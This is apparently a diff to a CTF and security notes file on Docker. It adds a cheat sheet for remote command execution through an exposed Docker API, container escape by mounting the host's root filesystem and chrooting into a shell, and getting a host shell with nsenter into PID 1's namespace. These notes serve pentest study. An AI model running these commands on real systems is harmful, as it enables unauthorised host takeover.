@@ -39,3 +39,48 @@ Installation <a href="https://github.com/wagoodman/dive#installation">ici</a>
 ```
 dive <image_id>
 ```
+<br>
+<br>
+
+# RCE
+
+```
+docker -H tcp://IP:PORT ps
+```
+Commands:
+
+```
+ps
+exec
+images
+run
+network ls
+```
+
+<br>
+<br>
+
+# Escaping
+
+```
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+```
+```
+We are essentially mounting the hosts "/" directory to the "/mnt" dir
+in a new container, chrooting and then connecting via a shell.
+```
+
+<br>
+<br>
+
+# Shared Namespaces
+
+![image](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/assets/97956863/4b284f0e-2353-4815-a4c5-27c2f67d0fa7)
+
+<br>
+
+```
+nsenter --target 1 --mount sh
+```
+
+![image](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/assets/97956863/45e4e663-c561-4608-b5ba-a058094ee8dd)
